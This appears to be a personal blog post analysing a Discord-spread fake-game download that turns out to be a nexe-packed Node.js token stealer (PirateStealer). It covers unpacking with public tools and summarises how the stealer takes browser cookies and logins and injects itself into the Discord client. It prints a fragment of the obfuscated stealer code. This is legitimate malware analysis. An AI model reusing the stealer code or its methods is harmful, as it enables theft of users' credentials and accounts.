---
layout: post
title:  "reverse engineering discord malware #1"
date:   2026-04-29
tags: js malware re deobfuscation discord boring
toc: true
---

# foreword

this sample comes from a typical "try my game on itch" social engineering tactic (commonly seen on discord), which [ntts has a good video about](https://www.youtube.com/watch?v=FLFuuxhx3RQ).

# the sample

the sample in question is `DefalGame.zip`, structured as a fake game. here are some checksums in case you somehow find the same malware somewhere :)

{% highlight text %}
md5    - cc30ea282cc09fbdb1a9b44a2f2f0d9e
sha1   - 7110c3e7f6198b0f15e75dce271cb968893d3bd7
sha256 - 3fee19bdf4e9a3737c1ac7d6facb4becb5debb102ffe0be0fab76d8624d281d1
{% endhighlight %}

anyway, the file structure:

{% highlight text desc="tree --noreport --du -h" collapsed %}
[ 92M]  .
├── [ 90M]  DefalGame.exe
├── [9.7K]  fonts
│   ├── [1.4K]  AssemblyInfo.cs
│   ├── [2.8K]  Resources.Designer.cs
│   └── [1.5K]  Settings.Designer.cs
├── [152K]  maps
│   ├── [ 22K]  1.nodemap
│   ├── [ 36K]  2.nodemap
│   ├── [ 22K]  3.nodemap
│   ├── [ 23K]  4.nodemap
│   ├── [ 22K]  5.nodemap
│   └── [ 24K]  6.nodemap
├── [  40]  options.ini
├── [1.4M]  saves
│   └── [1.4M]  Tutorial
│       ├── [ 936]  minimap 1.png
│       ├── [228K]  save 1.txt
│       ├── [  47]  save_info 1.txt
│       └── [1.1M]  tilemap.txt
├── [147K]  SFX setup.txt
└── [248K]  Water_map_base.tilemap
{% endhighlight %}

as you might expect, the largest file in this is `DefalGame.exe`. the rest of the files seem like they actually came out of a game, somehow... not sure about that. might come back to them, might not.

## the executable

so, `DefalGame.exe`. let's start with some basic recon.

{% highlight text desc="file DefalGame.exe" %}
DefalGame.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 6 sections
{% endhighlight %}

i also ran strings on the binary, and i see some interesting output:

{% highlight text desc="strings DefalGame.exe | tail -10" collapsed %}
    });
    /* Test 8: making sure that the zipped buffer from Test 7 contains correct data */
    it("checks if the zipped buffer contains correct data", function () {
        var T8ZippedFS = zipper.sync.unzip(localMemory.T7ZippedBuffer).memory();
        expect(T8ZippedFS.contents()).to.include("hello/says-hello") &&
        expect(T8ZippedFS.read("hello/says-hello", 'text')).to.equal("Hello") &&
        expect(T8ZippedFS.contents()).to.include("hello/world/says-world") &&
        expect(T8ZippedFS.read("hello/world/says-world", 'text')).to.equal("World");
    });
});<nexe~~sentinel>
{% endhighlight %}

well, that's javascript. oh boy. since it's from discord, let's see if they have a webhook URL:

{% highlight js desc="strings DefalGame.exe | grep -i webhook | tail -1" collapsed wrap %}
discord-webhook-node/LICENSE":[835955,1068],"./../node_modules/discord-webhook-node/README.md":[837023,6091],"./../node_modules/discord-webhook-node/index.d.ts":[843114,1899],"./../node_modules/discord-webhook-node/node_modules/form-data/License":[845013,1118],"./../node_modules/discord-webhook-node/node_modules/form-data/README.md.bak":[846131,11813],"./../node_modules/discord-webhook-node/node_modules/form-data/Readme.md":[857944,11813],"./../node_modules/discord-webhook-node/node_modules/form-data/index.d.ts":[869757,1825],"./../node_modules/discord-webhook-node/node_modules/form-data/lib/browser.js":[871582,101],"./../node_modules/discord-webhook-node/node_modules/form-data/lib/form_data.js":[871683,13577],"./../node_modules/discord-webhook-node/node_modules/form-data/lib/populate.js":[885260,177],"./../node_modules/discord-webhook-node/node_modules/form-data/package.json":[885437,3334],"./../node_modules/discord-webhook-node/package.json":[888771,1637],"./../node_modules/discord-webhook-node/src/api/index.js":[890408,138],"./../node_modules/discord-webhook-node/src/api/sendFile.js":[890546,526],"./../node_modules/discord-webhook-node/src/api/sendWebhook.js":[891072,346],"./../node_modules/discord-webhook-node/src/classes/messageBuilder.js":[891418,2017],"./../node_modules/discord-webhook-node/src/classes/webhook.js":[893435,3571],"./../node_modules/discord-webhook-node/src/index.js":[897006,161],"./../node_modules/discord-webhook-node/src/index.mjs":[897167,206],"./../node_modules/discord-webhook-node/src/utils/index.js":[897373,234],"./../node_modules/discord-webhook
discords=[],injectPath=[],runningDiscords=[];fs[_0x2aae38(0x293)+'c'](LOCAL)[_0x2aae38(0x34a)](_0xa27429=>{var _0x50f6a2=_0x2aae38,_0x5b09ac={'hUbip':_0x50f6a2(0x230),'WccBr':function(_0xffe3fa,_0x88a564){return _0xffe3fa+_0x88a564;}};if(_0xa27429[_0x50f6a2(0x1e9)](_0x5b09ac[_0x50f6a2(0x17d)]))discords[_0x50f6a2(0x34b)](_0x5b09ac[_0x50f6a2(0x267)](_0x5b09ac[_0x50f6a2(0x267)](LOCAL,'\x5c'),_0xa27429));else return;}),discords[_0x2aae38(0x34a)](function(_0x145a42){var _0x412468=_0x2aae38,_0x2126bb={'OIGiC':function(_0x3d027a,_0x495b07){return _0x3d027a+_0x495b07;},'QoOGX':_0x412468(0x1e5)+_0x412468(0x14c)+_0x412468(0x25c)+_0x412468(0x20c)+_0x412468(0x1d0)+_0x412468(0x29b)+_0x412468(0x2c4)};let _0x149568=_0x2126bb[_0x412468(0x229)](''+_0x145a42,_0x2126bb[_0x412468(0x1e0)]);glob[_0x412468(0x389)](_0x149568)[_0x412468(0x31a)](_0x28973c=>{var _0x23b01d=_0x412468;injectPath[_0x23b01d(0x34b)](_0x28973c);});}),listDiscords();function Infect(){var _0x4f5431=_0x2aae38,_0x5ee0ac={'nTMsu':_0x4f5431(0x2b5)+_0x4f5431(0x223),'BQwqg':_0x4f5431(0x205),'RTbni':_0x4f5431(0x305)+'y','wLwRk':_0x4f5431(0x364),'PpeqB':_0x4f5431(0x30a)+'I%','HNyxt':_0x4f5431(0x24d)+_0x4f5431(0x2ab),'fnwyW':_0x4f5431(0x1be),'mXgJd':_0x4f5431(0x158)+'r','mobAZ':_0x4f5431(0x298)+_0x4f5431(0x319),'irmtR':_0x4f5431(0x23e)+_0x4f5431(0x213),'MCMwa':_0x4f5431(0x38b),'KQbZl':function(_0x5096af,_0x353f30){return _0x5096af==_0x353f30;},'NkNST':_0x4f5431(0x331),'RBPAC':_0x4f5431(0x2a5),'xEayD':_0x4f5431(0x385),'JmepQ':function(_0x33f20d,_0x337b65){return _0x33f20d!=_0x337b65;},'JFusP':_0x4f5431(0x2b4),'OUWNC':_0 // [snip]
{% endhighlight %}

>a lot of discord malware freaks use a discord webhook as a c2, which is pretty funny.

well, that's obfuscated.`function Infect()` isn't, though... good one.

let's look at the other files before trying anything else here.

## exploring miscellaneous files

there are plenty of miscellaneous files packed in with this malware to make it look more like a game.

oddly enough, the "fonts" have some interesting information. take a look:

{% highlight cs mark_lines="8 12" collapsed desc="fonts/AssemblyInfo.cs" %}
﻿using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("Nitro Generator")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Nitro Generator")]
[assembly: AssemblyCopyright("Copyright ©  2021")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible
// to COM components.  If you need to access a type in this assembly from
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("a8827e34-5cc3-432d-80b9-80c0218fd2c9")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
{% endhighlight %}

*nitro generator*? like [discord nitro](https://discord.com/nitro).

and the same here:

{% highlight cs mark_lines="11 47" collapsed desc="fonts/Resources.Designer.cs" %}
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Nitro_Generator.Properties
{


    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources
    {

        private static global::System.Resources.ResourceManager resourceMan;

        private static global::System.Globalization.CultureInfo resourceCulture;

        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources()
        {
        }

        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager
        {
            get
            {
                if ((resourceMan == null))
                {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Nitro_Generator.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }

        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture
        {
            get
            {
                return resourceCulture;
            }
            set
            {
                resourceCulture = value;
            }
        }
    }
}
{% endhighlight %}

...and even here:

{% highlight cs mark_lines="11" collapsed desc="fonts/Settings.Designer.cs" %}
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Nitro_Generator.Properties {
    
    
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "15.9.0.0")]
    internal sealed partial class Settings : global::System.Configuration.ApplicationSettingsBase {
        
        private static Settings defaultInstance = ((Settings)(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings())));
        
        public static Settings Default {
            get {
                return defaultInstance;
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("")]
        public string textBox1 {
            get {
                return ((string)(this["textBox1"]));
            }
            set {
                this["textBox1"] = value;
            }
        }
    }
}
{% endhighlight %}

some pretty good signs of it being malware, given there are loose C# files for what would obviously be malware.

there's also this `options.ini` file, which we can look up and see if we get any hits online

{% highlight ini %}
[Windows]
SleepMargin=10
Usex64=True
{% endhighlight %}

and looking this up leads to [this steam guide](https://steamcommunity.com/sharedfiles/filedetails/?id=3007901975) for [GameMaker](https://gamemaker.io/en). so we can probably assume other files were taken from another game until proven wrong.

# deobfuscation (aka more recon)

here comes the fun part: extracting and deobfuscating this absolute mess. let's just try to extract with 7-zip

{% highlight text desc="7z x DefalGame.exe" %}

7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 94805609 bytes (91 MiB)

Extracting archive: DefalGame.exe
ERROR: DefalGame.exe
Cannot open the file as archive

    
Can't open as archive: 1
Files: 0
Size:       0
Compressed: 0
{% endhighlight %}

unlucky. maybe i should use my brain. 

## using my brain

i know it's javascript, so i looked for "nodejs to exe" programs and came across [nexe](https://github.com/nexe/nexe). oddly enough... the term **nexe** appears in 2106 lines, along with the line `<nexe~~sentinel>` appearing at the end of the binary.

i searched the nexe source code for *sentinel* to see if this odd strings appears, and believe it or not:

{% highlight text desc="grep -r 'sentinel' ./nexe" %}
./nexe/src/compiler.ts:    const sentinel = Buffer.from('<nexe~~sentinel>')
./nexe/src/compiler.ts:        cb(null, toStream(Buffer.concat([sentinel, trailers])))
./nexe/src/patches/boot-nexe.ts:const footerPosition = tailWindow.indexOf('<nexe~~sentinel>')
{% endhighlight %}

seems like it uses nexe after all. conveniently, someone made a [decompiler](https://github.com/unex/nexeDecompiler) for it. the readme says:

>inspired by reversing Discord token stealers

fuck it, let's try it.

{% highlight text desc="nexedecompiler DefalGame.exe --dest defaldecomp" %}
Using resources JSON
Using resources JSON
Writing 3274 files to /mnt/Storage/malware/DefalGame/defaldecomp
Entrypoint located at /mnt/Storage/malware/DefalGame/defaldecomp/xoLxeIdJt1gG.js
{% endhighlight %}

it worked, maybe?

{% highlight text desc="file xoLxeIdJt1gG.js" %}
xoLxeIdJt1gG.js: JavaScript source, Unicode text, UTF-8 text, with very long lines (53461), with no line terminators
{% endhighlight %}

53,461 character long line with *no line terminators*. right, lol.

# the real deobfuscation

let's forget about that and just run prettier

{% highlight text desc="wc -l pretty-malware.js" %}
2886 pretty-malware.js
{% endhighlight %}

not so bad actually. let's open this in a code editor:

>![obfuscated variable hell](/assets/images/posts/defalgame-re/beauty.png)

it's beautiful. giving the code a quick skim, we see this funny function:

{% highlight js %}
function _0x9688() {
  var _0x2367a0 = [
    "klmsp",
    "iscord",
    "5|1|6",
    "DnWYz",
    "iSuWy",
    "IZAHP",
    "AUVeA",
    "aYFUM",
    "TFkEm",
    "https://ww",
    "aOTHQ",
    "ROM\x20logins",
    "api/webhoo",
    "bfmgD",
    "PpeqB",
    // ...snip...
  ];
  _0x9688 = function () {
    return _0x2367a0;
  };
  return _0x9688();
}
{% endhighlight %}

funny library of text featuring `api/webhoo`, a partial URL for discord's webhook endpoint.

they don't seem encrypted at least, and there doesn't seem to be a VM. *w00t*

## someone made a tool for this

if we pipe this into [webcrack](https://github.com/j4k0xb/webcrack), we can see this is just skid slop malware "obfuscated" by a legacy version of *obfuscator.io*

>![screenshot of some deobfuscated SLOP!!!](/assets/images/posts/defalgame-re/slop.png)

...and it injects PirateStealer! no way!!!

>![picture of piratestealer splash](/assets/images/posts/defalgame-re/slop2.png)

## what does this shit even do

1. steals Google Chrome, Microsoft Edge, Opera GX Stable...
   - Cookies
   - Login data
   - the entire browser folder (???)
>![why does it steal the whole browser folder??](/assets/images/posts/defalgame-re/thebrowserfolder.png)
2. establishes persistence by injecting into the discord client
   - it also injects into BetterDiscord, a client mod for discord. cool.
3. allows the attacker to start and kill... discord. no, seriously, just discord.
>![discord exec/kill/infect functions (wtf?)](/assets/images/posts/defalgame-re/justdiscord.png)

# lessons learned

1. unpacking a nodejs binary packed with `nexe` is as easy as using someone's project specifically made to unpack nodejs binaries packed with `nexe`
2. webcrack is pretty cool for un-mangling javascript
3. stealers are boring, and PirateStealer is exceptionally boring.

oh, and the discord webhook is dead.

{% highlight text desc="curl https://canary.discord.com/api/webhooks/916448..." %}
{"message": "Unknown Webhook", "code": 10015}
{% endhighlight %}
